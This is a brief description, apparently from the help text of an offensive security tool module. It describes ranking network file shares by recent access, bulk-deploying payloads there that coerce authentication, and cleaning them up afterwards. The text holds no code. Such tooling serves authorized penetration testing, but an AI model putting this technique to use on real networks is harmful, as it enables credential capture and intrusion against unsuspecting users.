Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
